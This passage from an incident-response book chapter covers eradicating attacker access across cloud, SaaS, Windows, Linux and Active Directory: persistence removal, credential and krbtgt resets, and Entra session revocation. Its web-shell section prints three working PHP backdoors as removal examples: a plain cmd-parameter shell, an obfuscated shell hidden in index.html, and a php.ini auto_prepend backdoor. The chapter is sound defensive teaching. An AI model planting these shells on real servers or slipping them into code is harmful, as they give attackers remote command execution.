AWS aws iam list-roles and aws iam list-attached-role-policies --role-name <role>

Azure az role assignment list --all --query "[].{Principal:principalName,

Role:roleDefinitionName, Scope:scope}"

GCP gcloud projects get-iam-policy <project-id> --format=json

Identify cross-account or cross-tenant trust

AWS aws iam list-roles | jq '.Roles[].AssumeRolePolicyDocument' (inspect trust policies for

external principals)

Azure az ad sp list --query "[?appOwnerOrganizationId!='<tenant-id>']" (list service principals

from external tenants)

GCP gcloud projects get-iam-policy <project-id> | grep -E

'serviceAccount:.*iam.gserviceaccount.com' (identify external service accounts)

Pay particular attention to privileged roles and roles with permissions to modify IAM itself

(iam:PutRolePolicy, iam:AttachUserPolicy, iam:CreateRole, iam:UpdateAssumeRolePolicy, etc.), as these

permissions allow attackers to continuously create new persistence mechanisms as long as they retain

access to the cloud environment.

Infrastructure Investigation

For the infrastructure itself (virtual machines, containers, storage, databases, etc.), apply the same forensic

procedures used in on-premises environments. The important difference is that cloud environments offer

additional capabilities for evidence preservation, such as snapshots and logging.

Examine virtual machine and container images for backdoors and persistence. Attackers often modify VM

images or container images stored in registries to ensure that newly deployed instances automatically

include backdoors. Review recent changes to images in the environment, using differential analysis with

known-good baselines (such as gold images used for automated deployments).

Analyze storage access and potential data exfiltration.  Cloud storage services like S3, Azure Blob Storage,

and Google Cloud Storage are common targets. Review storage access logs to identify which objects were

accessed, downloaded, or had permissions modified. Check for publicly exposed buckets or containers that

the attacker may have configured to enable anonymous access.  Use the cloud provider’s native tools to

evaluate aggregate logging data, or use command line tools to analyze access patterns as shown in Listing

82. [22]

Listing 82 | AWS S3 Log Analysis with s3logparse.py

$ s3logparse.py

s3logparse.py: Extract useful information from AWS S3 logs.

Usage: ./s3logparse.py [useragent|toptalkers|topuploaders|topdownloaders|topfiles] <log files>

$ s3logparse.py useragent ../mys3logs/* | cut -c 1-72

34140 - aws-cli/1.16.192 Python/2.7.10 Darwin/18.7.0 botocore/1.12.182 1

876 - Amazon CloudFront

222 - Cyberduck/7.1.1.31577 (Mac OS X/10.14.6) (x86_64)

69 - S3Console/0.4, aws-internal/3 aws-sdk-java/1.11.915 Linux/4.9.230-0

44 - S3Console/0.4, aws-internal/3 aws-sdk-java/1.11.991 Linux/5.4.109-5

[...]

$ s3logparse.py toptalkers ../mys3logs/*

20.43 GiB - 254.59.11.25 2

15.95 GiB - 253.252.70.185

Eradicate Activity | Chapter 13 | 325

13.80 GiB - 252.59.250.11

12.85 GiB - 251.252.12.173

12.81 GiB - 251.252.12.190

[...]

1 The most frequent user agent accessing the S3 bucket is AWS CLI, indicating scripted access.

2 IP address with the highest data transfer volume from the S3 bucket logging data.

Investigate serverless functions and event-driven infrastructure. Attackers can deploy malicious serverless

functions that execute in response to triggers, providing persistent access without traditional compute

infrastructure. Review recently deployed or modified functions, examining their code for backdoors and

their triggers for unexpected event sources. Check IAM roles for excessive permissions that could enable

privilege escalation or lateral movement.

Review network configurations and security group modifications. Attackers modify firewall rules, security

groups, and network ACLs to enable access to compromised resources or to establish command-and-

control channels. Check VPC peering connections, VPN configurations, and transit gateway attachments

that could enable lateral movement to other cloud environments or on-premises networks.

SaaS Investigation and Eradication

Software-as-a-Service compromises typically involve account takeover, OAuth token abuse, and

exploitation of application-level access controls rather than traditional infrastructure compromise. These

compromises are particularly difficult to investigate, since affected organizations lack access to the

underlying infrastructure to collect logs or forensic images from the SaaS provider. Further, many smaller

SaaS providers have limited logging capabilities, making it challenging to reconstruct attacker activity.

Organizations often have to rely on minimal insight from the SaaS provider combined with logs from their

own integrated systems to piece together the attacker’s actions.

When investigating an incident involving a SaaS provider, start by identifying the provider’s logging

capabilities. Major platforms such as Microsoft 365, Google Workspace, and Salesforce provide audit logs via

administrative consoles or APIs. Smaller or specialized SaaS applications may have minimal logging, or logs

may only be available by opening a support case with the provider. Request activity reports and access logs

covering the compromise timeframe, and specifically ask whether any additional logging data is available

beyond standard administrative interfaces.

Use integration logging from on-premises or IaaS environments connected to the SaaS platform.

Organizations often connect SaaS applications to internal systems via APIs, webhooks, or other middleware.

These integration points may capture request logs, authentication events, or data transfer records that

provide insight into attacker activity even when the SaaS platform’s native logging is limited. Review logs

from identity providers, API gateways, SIEM systems, and any custom integration services that interact with

the compromised SaaS application.

Enumerate SaaS privileges to identify persistence mechanisms and excessive permissions. Attackers

frequently create new administrative accounts, elevate privileges on compromised accounts, create API

keys, or grant OAuth consent to malicious applications. Review user roles and permissions, looking for

recently modified access levels or accounts with administrative privileges that don’t align with job

responsibilities. Examine OAuth applications and third-party integrations, identifying any applications that

were consented to during the compromise timeframe or applications that have suspicious permission

scopes.

MIDNIGHT BLIZZARD OAUTH CAMPAIGN

In January 2024, Microsoft disclosed that Midnight Blizzard (also known as NOBELIUM), a Russian

state-sponsored threat actor, had compromised Microsoft’s corporate environment through OAuth

application abuse. [23]

The attackers gained initial access by password-spraying a legacy, non-

production tenant account that did not have multi-factor authentication. From this initial access, the

attackers gained access to a legacy test OAuth application that had elevated access to Microsoft’s

corporate environment. Using this OAuth application’s permissions, the attackers requested access

tokens with powerful Microsoft Graph API scopes including Directory.ReadWrite.All,

RoleManagement.ReadWrite.Directory, Application.ReadWrite.All, and

AppRoleAssignment.ReadWrite.All. [24]

Figure 107 | Microsoft Legacy Test Application

With these permissions, the attackers created a new user account in Microsoft’s corporate tenant

and assigned it Global Administrator privileges. With their new privileged access, they created

additional malicious OAuth applications and used the compromised admin account to grant these

applications full_access_as_app permission to Microsoft 365 services including Microsoft Exchange

Online. This permission provided unrestricted access to corporate mailboxes, allowing the attackers

to exfiltrate emails from senior leadership and employees in cybersecurity and legal functions.

The Midnight Blizzard campaign illustrates why SaaS eradication requires identifying and revoking

OAuth applications, API permissions, and service principals rather than simply resetting user

passwords. The attackers maintained access via OAuth applications they controlled, allowing them to

continue accessing Microsoft’s environment even if the initially compromised account’s password

was changed. Effective eradication required identifying all malicious OAuth applications, revoking

their permissions, removing attacker-created accounts, and auditing consent grants across the

Eradicate Activity | Chapter 13 | 327

tenant.

Organizations responding to similar compromises should enumerate all OAuth applications and their

permission scopes, identify applications created or modified during the attack timeframe, review

consent grants for high-privilege permissions like full_access_as_app or Mail.ReadWrite, and audit

service principal credentials that could provide persistent access independent of user accounts.

ERADICATE ATTACKER ACCESS

With the investigation complete (based on the current response actions loop), the response team transitions

from understanding the compromise to eliminating it. The investigation revealed what the attacker did, how

they maintained access, and what artifacts they left behind. Now, responders apply that knowledge to

systematically remove every trace of the attacker’s presence from the environment.

Eradication actions fall into several categories, each addressing different aspects of attacker access.

Persistence mechanism removal eliminates the footholds that allow attackers to maintain access across

reboots and credential changes. Account and access remediation terminates active attacker sessions and

removes unauthorized accounts they created. Credential rotation invalidates stolen authentication

materials that would otherwise allow attackers to return. System restoration replaces compromised

systems with known-good configurations when targeted cleanup cannot provide sufficient confidence.

Vulnerability remediation closes the security gaps that enabled the initial compromise and any weaknesses

the attacker exploited during lateral movement. Finally, defense-in-depth controls introduce additional

security layers to detect and prevent similar attacks in the future.

Figure 108 | Eradicate Attacker Access Process

Removing Persistence Mechanisms

Persistence removal follows a systematic process that ensures complete eradication while preserving

evidence for post-incident analysis.

Start by compiling a complete inventory of identified persistence mechanisms from investigation findings.

This inventory should include the mechanism type, affected system, file paths or registry locations, and any

associated processes or services. Document each mechanism thoroughly before removal, capturing

screenshots, file hashes, and configuration details that may be needed for IOC development or legal

proceedings.

Plan the removal sequence to address dependencies between mechanisms. Some persistence mechanisms

include watchdog processes that monitor for and restore the components that had been removed. Identify

these relationships during planning so the response team can remove watchdog processes before the

mechanisms they protect.

Verify removal immediately after execution by re-running the enumeration techniques used during the

investigation. Persistence locations that previously contained malicious entries should now be clean. Any

remaining artifacts indicate incomplete removal requiring additional action.

Eradicate Activity | Chapter 13 | 329

Continue to monitor systems following removal to detect reappearance. Persistence

mechanisms that return after removal indicate missed components, malicious processes

that evaded detection, or reinfection through an attack vector.

Windows Persistence Removal Considerations

Windows systems provide numerous persistence locations that attackers exploit. The specific locations

used vary by attacker sophistication and the privileges they obtained during the compromise. Responders

should address each category systematically, using insights from the investigation to guide removal efforts.

Windows persistence mechanisms span registry Run keys, scheduled tasks, services, WMI event

subscriptions, startup folders, and numerous other locations. The Sysinternals Autoruns utility allows

analysts to enumerate multiple persistence mechanisms on a system in a single view. Autoruns displays

entries from dozens of persistence locations and highlights items that may be suspicious based on signature

verification and VirusTotal integration, as shown in Figure 109.

Figure 109 | Sysinternals Autoruns Persistence Enumeration

Export the Autoruns results to a file for documentation before making changes, using the GUI File | Save

feature or the command line version autorunsc.exe to produce a CSV file, as shown in Listing 83. Compare

the output against a known-good baseline from a clean system of the same configuration to identify entries

that should not be present.

The Autoruns GUI can save the analysis to an Autoruns file ( .arn), which can be opened on

a separate analysis system for additional investigation.

Listing 83 | Exporting Autoruns CSV Results for Analysis

PS C:\Users\ttidmas> C:\tools\Sysinternals\autorunsc.exe -nobanner -c -o autoruns-ws1-ttidmas-

20251201.txt

PS C:\Users\ttidmas> Get-Content .\autoruns-ws1-ttidmas-20251201.txt | Select-Object -First 4

Time,Entry Location,Entry,Enabled,Category,Profile,Description,Company,Image Path,Version,Launch

String

12/7/2019 9:15 AM,HKLM\System\CurrentControlSet\Control\Terminal

Server\Wds\rdpwd\StartupPrograms,,,"Logon",System-wide,,,,,,

1/26/2007 2:00 AM,"HKLM\System\CurrentControlSet\Control\Terminal

Server\Wds\rdpwd\StartupPrograms","rdpclip",enabled,"Logon",System-wide,"RDP Clipboard

Monitor","Microsoft Corporation","c:\windows\system32\rdpclip.exe",10.0.19041.746,"rdpclip"

11/30/2025 1:49 PM,HKLM\SOFTWARE\Microsoft\Windows

NT\CurrentVersion\Winlogon\Userinit,,,"Logon",System-wide,,,,,,

After identifying malicious persistence through Autoruns or investigation techniques, remove each

mechanism using the appropriate method for its type. Persistence mechanisms identified in Autoruns can

be removed from within the Autoruns GUI. Alternatively, use PowerShell to remove persistence mechanisms

manually, as shown in Listing 84.

Listing 84 | Removing a Malicious Windows Service

PS C:\> Get-Service "Evast Updater"

Status   Name               DisplayName

------   ----               -----------

Running  Evast Updater      fznRlhbehmol

PS C:\> Set-Service -Name "Evast Updater" -StartupType Disabled 1

PS C:\> Stop-Service "Evast Updater" -Force

PS C:\> sc.exe delete "Evast Updater"

[SC] DeleteService SUCCESS

PS C:\> Get-Service "Evast Updater" -ErrorAction SilentlyContinue 2

PS C:\>

1 Disable the service before stopping and removing it to prevent an automatic restart.

2 The verification command should return no results if the removal succeeded.

The removal sequence first disables the service to prevent a restart, then stops the service, and finally

deletes the service registration entirely. Using sc.exe delete  rather than PowerShell’s Remove-Service

ensures compatibility with older Windows versions where Remove-Service may not be available. The final

verification command should return no results if removal succeeded.

Similar approaches apply to other Windows persistence types as well.

Eradicate Activity | Chapter 13 | 331

Linux Persistence Removal Considerations

Linux systems provide different persistence mechanisms than Windows, but the systematic approach to

removal remains the same. Use the persistence inventory from investigation to guide removal, addressing

all identified mechanisms as part of coordinated eradication. Table 28 summarizes several common Linux

persistence types and their removal methods.

Wherever possible, run the persistence enumeration and removal commands as root for

comprehensive results.

Table 28 | Linux Persistence Types and Removal Methods

LINUX PERSISTENCE

TYPE

REMOVAL METHOD

At Jobs List with atq, remove with atrm <job_number>

Cron Jobs Use crontab -r or edit system cron files to remove malicious entries

Git Hooks Remove or sanitize hook scripts in .git/hooks/ directories

Library Hijacking Remove entries from /etc/ld.so.preload and check LD_PRELOAD in environment files

Malicious Kernel

Modules

Unload with rmmod or modprobe -r, delete .ko file, remove from /etc/modules or

/etc/modules-load.d/

PAM Backdoors Review and restore legitimate modules in /etc/pam.d/ and /lib/security/

Package

Manager Hooks

Check and clean /etc/apt/apt.conf.d/ or /etc/yum/pluginconf.d/

SSH Authorized

Keys

Edit ~/.ssh/authorized_keys (for each local user) to remove unauthorized keys

Sudo

Configuration

Review the output of sudo -l (for each local user), remove unauthorized Sudo

entries with visudo

SUID/SGID

Binaries

Remove the binary or clear the SUID/SGID bit with chmod u-s/chmod g-s

Shell RC/Profile

Files

Remove malicious entries from .bashrc, .bash_profile, /etc/profile,

/etc/profile.d/*

Systemd

Services

Stop, disable, and delete unit files using systemctl commands

Udev Rules Delete malicious rules from /etc/udev/rules.d/, then run udevadm control

--reload

Verify removal by listing the persistence mechanism using administrative commands such as atq and by

listing the files in associated configuration directories such as /var/spool/at to confirm malicious entries no

longer appear.

Web Shell Removal

Web shells provide attackers with interactive access to compromised web servers. Remove the web shell file

and any associated configuration or log files the shell may have created. Investigation may have identified

multiple web shells deployed for redundancy. Remove all identified shells as part of coordinated eradication.

Web shells may be deployed as standalone files, as embedded content within existing web application files,

or as configuration modifications that execute across multiple files. The example in Listing 85  shows a

simple standalone web shell file that executes commands passed via the cmd GET parameter. Web shell

eradication would involve deleting this file from the web server.

Listing 85 | Standalone Web Shell Backdoor File

/var/www/html $ cat imgupload.html

<html>

<body>

<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">

<input type="TEXT" name="cmd" autofocus id="cmd" size="80">

<input type="SUBMIT" value="Execute">

</form>

<pre>

<?php

if(isset($_GET['cmd']))

{

system($_GET['cmd']); 1

}

?>

</pre>

</body>

</html>

1 Executes commands passed via the cmd GET parameter for remote command execution.

The example in Listing 86 shows an obfuscated web shell embedded within an HTML file. The HTML file is

likely part of a larger web application, so eradication involves removing the obfuscated PHP code while

preserving the rest of the HTML content.

Listing 86 | Obfuscated Web Shell Embedded in HTML File

/var/www/html $ tail -5 index.html

<script src="assets/js/main.js"></script>

</body>

<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-

40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];ech

o`$_`?> 1

</html>

1 Obfuscated PHP code that decodes and executes commands for remote command execution.

The example in Listing 87  is more subtle, attempting to establish persistence by modifying the PHP

configuration to automatically load a backdoor script for every request. Removing this web shell requires

Eradicate Activity | Chapter 13 | 333

reverting the configuration change and deleting the backdoor script.

Listing 87 | Web Shell via Configuration Modification

/var/www/html $ tail -4 /etc/php7/php.ini

; Local Variables:

; tab-width: 4

; End:

auto_prepend_file = /etc/php7/runmeconfig.php

/var/www/html $ cat /etc/php7/runmeconfig.php

<?php if(isset($_GET['runme'])) { system($_GET['runme']); } ?> 1

1 Configuration-level web shell persistence mechanism.

After removing web shell content, restart the web server to clear any in-memory artifacts that might persist

after file deletion. Some web shells load components into memory that continue executing even after the

file is removed.

Web shells can exist at the web-server layer, but also at the web application layer,

requiring a comprehensive investigation of application code, plugins, and modules to

identify and remove all instances.

Cloud Persistence Removal

Cloud environments present unique persistence challenges because attackers can create resources that

execute code without traditional host-based persistence. The investigation should have identified

unauthorized cloud resources, IAM modifications, and changes to container images. Eradication now

focuses on removing these cloud-native persistence mechanisms.

Lambda/Serverless Functions

Serverless functions allow attackers to execute code without managing servers, making them attractive for

persistence. Delete malicious functions identified during the investigation using the cloud provider’s CLI

tools.

Table 29 | Removing Malicious Serverless Functions from Major Cloud Providers

CLOUD PROVIDER REMOVAL COMMAND

AWS aws lambda delete-function --function-name MaliciousFunction

Azure az functionapp delete --name MaliciousFunctionApp --resource-group

ResourceGroup

Google gcloud functions delete malicious-function --region us-central1

After deleting functions, review CloudTrail, Azure Activity Log, or Cloud Audit Logs to confirm the deletion

was successful. Check for associated triggers such as API Gateway endpoints, S3 event notifications, or

CloudWatch Events rules that may need to be removed.

IAM Policy Modifications

IAM changes represent a particularly insidious form of cloud persistence because they grant access rather

than execute code directly. Attackers who modify IAM policies can grant themselves persistent access

across cloud accounts that will survive even comprehensive credential rotation.

Revert unauthorized IAM policy changes by comparing current policies against the baseline configuration

established before the incident. If the organization uses infrastructure-as-code, the IaC repository provides

a definitive baseline for comparison. Remove unauthorized users and service principals that the attacker

created to maintain access. Revoke elevated permissions granted during the compromise, particularly

administrative roles assigned to standard user accounts or overly permissive policies attached to existing

roles. Reset access keys for compromised accounts to invalidate any credentials the attacker may have

stolen.

Container Image Modifications

Container images provide another vector for cloud persistence. Attackers who modify container images

ensure their code executes whenever new containers are deployed from those images. This persistence

survives container restarts, scaling events, and even cluster redeployment if the compromised images

remain in use.

Remove manipulated images from both local Docker hosts and container registries. After removing images

from registries, force redeployment of affected workloads to ensure running containers are replaced with

instances from known-good images. Review CI/CD pipelines to ensure they build from trusted base images

and that build processes have not been compromised.

Account and Identity Remediation

Account and identity remediation addresses the authentication and authorization materials that provide

access to compromised systems and connected services. It is an important element for fully eradicating

attacker access. Failure to remediate identity compromise leaves attackers an opportunity to regain access

even after persistence mechanisms are removed. Effective identity remediation follows a structured

approach rather than disorganized credential resets.

Modern identity systems are complex, with multiple authorization paths that attackers can exploit. Even a

single workstation compromise can have cascading effects requiring account and identity remediation

across multiple systems, including local accounts, Active Directory, federated identity providers, cloud

identity platforms, and SaaS applications. This section examines important considerations for effective

account and identity remediation, though organizations should adapt these principles to their specific

identity architectures.

When identity remediation requires creating replacement accounts (for example, new

privileged accounts for severe compromises or temporary accounts during phased resets),

the incident response team should record each account in the incident documentation at

creation, including the purpose, intended lifespan, and owner, so that closure activities can

review each account for retention or removal.

Local Account and Credential Remediation

Attackers often create unauthorized local user accounts on compromised systems to maintain access.

Eradicate Activity | Chapter 13 | 335

Following an investigation, remove unauthorized local user accounts to prevent them from being used for

continued access.

Always verify that an account is not required before removal.

Locally created unauthorized user accounts on Windows can be removed using Windows administrative

GUI tools or PowerShell commands as shown in Listing 88. Following the removal of an account, verify that

it no longer exists by attempting to retrieve it again.

Listing 88 | Removing Unauthorized Local Windows Account

PS C:\WINDOWS\system32> Get-LocalUser EVASTUtilityAccount

Name                Enabled Description

----                ------- -----------

EVASTUtilityAccount True

PS C:\WINDOWS\system32> Get-LocalUser EVASTUtilityAccount | Remove-LocalUser 1

PS C:\WINDOWS\system32> Get-LocalUser EVASTUtilityAccount -ErrorAction SilentlyContinue 2

PS C:\WINDOWS\system32>

1 Remove the local user account.

2 The verification command should return no results if the removal was successful.

Similarly, on Linux systems, analysts can remove unauthorized local user accounts using the userdel

command, as shown in Listing 89.

Listing 89 | Removing Unauthorized Local Linux Account

$ grep apache2 /etc/passwd

apache2:x:1000:1000:Apache Service Account,,,:/home/apache2:/bin/bash

$ sudo userdel -r apache2

userdel: apache2 mail spool (/var/mail/apache2) not found 1

$ grep apache2 /etc/passwd 2

$

1 The warning indicates that no mail spool exists for the user.

2 The verification command should return no results if the removal succeeded.

In the example in Listing 89, the -r argument removes the user’s home directory, the mail

spool, and the account itself. It is important to collect evidence from the user’s home

directory during the containment activity before running this command.

These steps are straightforward: identify the unauthorized local accounts, remove them, and verify removal.

However, organizations with complex identity environments, including Windows Active Directory, Entra,

and other identity providers, should take a more structured approach to account and credential

remediation.

Active Directory Account and Credential Remediation

Attackers who compromise Active Directory infrastructure can gain access to cryptographic materials that

allow them to forge authentication tokens, persist across password resets, and maintain access through

multiple authorization paths. Simply resetting passwords for known-compromised accounts is insufficient.

Attackers who obtain privileged credentials or authentication secrets can continue accessing systems until

those underlying key materials are changed.

A credential reset after an Active Directory compromise requires a structured, phased approach rather than

a single mass reset. Execute credential resets in phases aligned with account privilege levels (tier 0 through

tier 2) and infrastructure criticality.

Microsoft’s tier model for enterprise access defines three account tiers: tier 0 (domain

admins, enterprise admins, schema admins), tier 1 (server and application admins), and tier

2 (workstation users). [25]

Phase 1: Privileged Account Reset

Reset credentials for all Tier-0 and Tier-1 privileged accounts first. These accounts provide the greatest

access and represent the highest risk if attackers retained copies of the credentials.

Privileged accounts requiring immediate reset include:

• Built-in Administrator accounts on domain controllers and member servers.

• Domain Admins, Enterprise Admins, and Schema Admins group members.

• Backup Operators and other groups with effective administrative rights.

• Service accounts for identity infrastructure, including AD FS, Entra Connect, and certificate services.

• Any other accounts with effective domain admin privileges through nested group membership or

delegated permissions.

Before or concurrently with privileged account resets, analysts should reduce privileged group

memberships to the minimum required. Remove any unauthorized members from Domain Admins,

Enterprise Admins, Backup Operators, and similar groups.

Listing 90 | Eradicate Unauthorized Domain Admin Group Membership

PS C:\> Remove-ADGroupMember -Identity "Domain Admins" -Members "ttidmas" -Confirm:$false

PS C:\> $cred = Get-Credential "CORP\ttidmas"

cmdlet Get-Credential at command pipeline position 1

Supply values for the following parameters:

Credential

Password for user CORP\ttidmas: ********

PS C:\> Set-ADAccountPassword -Identity "ttidmas" -Reset -NewPassword $cred.Password

PS C:\> Set-ADUser -Identity "ttidmas" -ChangePasswordAtLogon $true

PS C:\>

Eradicate Activity | Chapter 13 | 337

ACCOUNT RECREATION VS. PASSWORD RESET FOR SEVERE COMPROMISES

In severe Active Directory compromises where attackers have domain controller access, DCSync

capability, or prolonged undetected access, Microsoft recommends creating entirely new privileged

accounts rather than resetting existing ones. The rationale for account recreation is that existing

account objects may have been modified in ways that are difficult to detect. Attackers may have

added Service Principal Names (SPNs), modified account attributes, or established persistence

mechanisms tied to specific account SIDs. Creating new accounts provides a clean break from any

potential compromise of the account object itself, beyond credentials alone. [26]

Microsoft’s approach recommends that administrators create new tier 0 accounts first, verify that

they function correctly, then disable (not delete) the old accounts and move them to a dedicated OU

for quarantine. This sequencing maintains administrative access throughout the transition and

preserves old accounts for forensic analysis.

Figure 110 | Microsoft’s Account Recreation Approach

However, this approach has disadvantages. It adds significant complexity to an already challenging

recovery process. Application dependencies, group memberships, and delegated permissions should

be recreated for new accounts. Service accounts with hardcoded SIDs in application configurations

may also require application changes.

For many organizations, particularly those without mature identity management practices, the

operational risk of account recreation may outweigh the security benefits.

Account recreation is most appropriate when the investigation confirms or strongly suggests the

attacker had the access and time to modify domain account objects, or when the organization cannot

determine with confidence what the attacker accessed. For compromises limited to credential theft

without domain controller access, password resets combined with krbtgt rotation typically provide

sufficient remediation.

Phase 2: Service Account and Identity Infrastructure Reset

Reset credentials for service accounts and identity infrastructure components. These accounts often have

broad access across the environment and may be targeted for persistence.

Service accounts requiring reset include directory synchronization accounts, certificate authority service

accounts, database service accounts, and application service accounts that authenticated to compromised

systems. Coordinate with application teams to update service configurations before the reset takes effect.

For identity infrastructure accounts, pay particular attention to:

• Entra Connect synchronization accounts

• AD FS service accounts and certificates

• Certificate Services (AD CS) service accounts

• Any accounts used for federation or identity bridging

Phase 3: General User Account Reset

After privileged and service accounts are secured, execute a staged reset of remaining user accounts.

Prioritize targeted users and accounts with broad data access before the general user population.

Plan for user impact during mass credential resets. Prepare helpdesk staff for increased support volume.

Use self-service password reset (SSPR) with strong identity proofing where possible to reduce

administrative burden. Communicate the reset timeline to affected users in advance.

Credential resets prevent attackers from using stolen passwords for future authentication attempts.

However, password resets alone do not revoke existing sessions or invalidate tokens issued before the reset.

Attackers who established sessions or obtained tokens before the password change can continue using

those authorization materials until they expire or are explicitly revoked. Responders need to take additional

steps to address cryptographic root rotation, session revocation, and hybrid identity remediation.

Krbtgt Account Reset

The krbtgt account (sometimes capitalized as KRBTGT in Microsoft documentation) is the cryptographic

root of trust for Kerberos authentication in Active Directory. Attackers who obtain the krbtgt hash can forge

Golden Tickets that grant access to any resource in the domain. [27]

These forged tickets remain valid

regardless of user password resets until the krbtgt password itself is reset.

When investigation indicates attackers compromised domain controllers, executed DCSync attacks, or

obtained the krbtgt hash, responders need to reset the krbtgt password twice with appropriate delays

between resets.

Eradicate Activity | Chapter 13 | 339

The krbtgt account maintains a password history of two. The first reset invalidates tickets

issued with the oldest stored key. The second reset invalidates tickets issued with the key

that was current at the time of compromise.

Reset the krbtgt password using Active Directory Users and Computers or PowerShell, as shown in Listing

91.

Listing 91 | Resetting the krbtgt Account Password

PS C:\> Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString

-AsPlainText "initialresetpassword" -Force)

PS C:\> repadmin /replsum

Replication Summary Start: 2025-12-14 09:32:10

Source DSA          largest delta    fails/total    %%   error

FM-SRV-DC01          00h:12m:33s        0 /   12     0

FM-SRV-FS01          00h:10m:51s        0 /   12     0

FM-NET-FW01          00h:09m:14s        0 /   12     0

Destination DSA     largest delta    fails/total    %%   error

FM-SRV-DC01          00h:12m:33s        0 /   12     0

FM-SRV-FS01          00h:10m:51s        0 /   12     0

FM-NET-FW01          00h:09m:14s        0 /   12     0

Replication Summary End: 2025-12-14 09:32:12

The password you specify when setting the krbtgt user password is not significant since

the domain generates a strong password automatically, independent of the one you

provided.

Wait at least the maximum Kerberos ticket lifetime (default ten hours) between the first and second resets.

This delay allows legitimately issued tickets to expire naturally before the second reset invalidates the key

they were issued under. In practice, administrators may want to wait longer, perhaps twenty-four to forty-

eight hours, to account for systems that may be offline so that they can receive updates when they

reconnect.

Verify replication completed successfully after each reset using repadmin /replsum  before proceeding.

Incomplete replication can result in authentication failures when users authenticate against domain

controllers with inconsistent krbtgt keys.

Multi-Domain Forest Considerations

In multi-domain forests, reset krbtgt in child domains before resetting it in parent domains. Each domain

has its own krbtgt account, and the reset sequence should follow trust relationships. Perform two resets per

domain, with appropriate delays, and verify replication between each reset.

Domain Controller Machine Account Reset

Domain controllers authenticate to each other using machine account passwords. Attackers who

compromise domain controllers may have obtained machine account credentials, allowing them to

impersonate domain controllers even after other remediation steps are complete.

As part of the eradication effort, reset the domain controller machine account passwords individually after

completing krbtgt resets. Use netdom to reset each domain controller’s machine account password:

Listing 92 | Resetting Domain Controller Machine Account Password

PS C:\> netdom resetpwd /server:FM-SRV-DC01 /userd:FALSIMENTIS\Administrator /passwordd:* 1

Type the password associated with the domain user: ************

The machine account password for the local machine has been successfully reset.

The command completed successfully.

PS C:\>

1 The second d in /passwordd is used to distinguish the domain password from a local account.

Execute this command on each domain controller, specifying a different domain controller as the /server

target. The /passwordd:* parameter prompts for the password interactively rather than exposing it on the

command line.

Allow replication to complete between machine account resets to ensure password history remains

synchronized across domain controllers. Domain controllers maintain a password history of two. If

password changes exceed this history before replication completes, authentication failures between domain

controllers can occur.

Trust Password Reset

If the forest recovery is in response to a security breach involving inter-domain or inter-forest trusts, reset

trust passwords after re-establishing control over domain controllers and completing krbtgt resets.

Trust passwords secure the authentication channel between domains and forests. Attackers who

compromised trust relationships can use them to move between trusted environments. Reset trust

passwords on the trusting side of each affected trust relationship to sever any attacker persistence that

relies on compromised trust credentials.

Disabling Unconstrained Delegation

Unconstrained delegation allows a service to impersonate any user who authenticates to it and to store

their Kerberos tickets for reuse. Attackers who compromise a system with unconstrained delegation can

harvest tickets from any user who connects, including privileged accounts. This makes unconstrained

delegation a significant risk for persistence and lateral movement.

Review computer and user objects for unconstrained delegation settings and disable them where not

strictly required. Identify objects with unconstrained delegation enabled as shown in Listing 93.

Eradicate Activity | Chapter 13 | 341

Listing 93 | Identifying Unconstrained Delegation in Active Directory

PS C:\> Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

Name          DNSHostName                    TrustedForDelegation

----          -----------                    --------------------

FM-SRV-DC01   FM-SRV-DC01.falsimentis.local  True

FM-SRV-FS01   FM-SRV-FS01.falsimentis.local  True

FM-WEBDEV     FM-WEBDEV.falsimentis.local    True

PS C:\> Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation 1

DistinguishedName                              SamAccountName

-----------------                              --------------

CN=svcWebKrb,CN=Users,DC=falsimentis,DC=local  svcWebKrb 2

PS C:\>

1 Output from this command is modified for space considerations.

2 svcWebKrb is a user account with unconstrained delegation enabled.

For objects that no longer require delegation, disable the setting, as shown in Listing 94.

Listing 94 | Disabling Unconstrained Delegation

PS C:\> Set-ADComputer -Identity "FM-WEBDEV" -TrustedForDelegation $false

PS C:\> Set-ADUser -Identity "svcwebkrb" -TrustedForDelegation $false

PS C:\>

Where delegation is required for application functionality, migrate to constrained delegation or resource-

based constrained delegation, which restricts the services to which an account can delegate user access.

Constrained delegation provides equivalent functionality while significantly reducing the attack surface.

[28]

Hybrid and Entra ID Remediation

Organizations with hybrid Active Directory and Entra ID environments face additional remediation

requirements. Password resets in on-premises Active Directory do not automatically revoke cloud sessions,

and attackers who compromised hybrid identity infrastructure may have established persistence in both

environments.

Hybrid identity remediation combines on-premises credential resets with cloud session revocation and

conditional access enforcement. The goal is to ensure attackers cannot reauthenticate from compromised

devices after credentials are reset.

Entra ID Session and Token Revocation

Revoke all refresh tokens and active sessions for compromised users in Entra ID. This forces re-

authentication for all cloud applications the next time they attempt to use stored tokens. Password reset

alone is insufficient because existing tokens remain valid until they expire or are explicitly revoked.

Revoke user sessions using the Microsoft Graph PowerShell SDK or through the Entra admin center. Using

PowerShell, revoke all refresh tokens for a compromised user as shown in Listing 95.

Listing 95 | Revoke Entra ID User Sessions

PS C:\> Connect-MgGraph -Scopes "User.ReadWrite.All"

Welcome To Microsoft Graph!

PS C:\>

PS C:\> Revoke-MgUserSignInSession -UserId "ttidmas@falsimentis.com"

Id                                   DisplayName   UserPrincipalName —

-----------   -----------------

d13a91fb-4b4c-43c8-9034-3ae8947c3121 Tamra Tidmas  ttidmas@falsimentis.com

PS C:\>

Alternatively, in the Entra admin center, navigate to Identity | Users | [select user] | Revoke sessions  to

invalidate all refresh tokens for the user.

For compromised user accounts, revoke all refresh tokens immediately after resetting their passwords. If

investigation suggests the attacker can complete self-service password reset or MFA challenges, block the

user entirely by disabling their account as shown in Listing 96.

Listing 96 | Disable Entra ID User Account

PS C:\> Update-MgUser -UserId "ttidmas@falsimentis.com" -AccountEnabled:$false

Alternatively, in the Entra admin center, navigate to Identity > Users > [select user] > Properties  and set

Block sign in to Yes to disable the account.

Some Entra integration applications support back-channel logout, which actively notifies connected

applications to terminate sessions when an administrator revokes access. Without back-channel logout

support, application sessions may remain active until their tokens expire naturally, even after the identity

provider session is terminated. For applications that do not support back-channel logout, manually

terminate sessions through each application’s administrative interface.

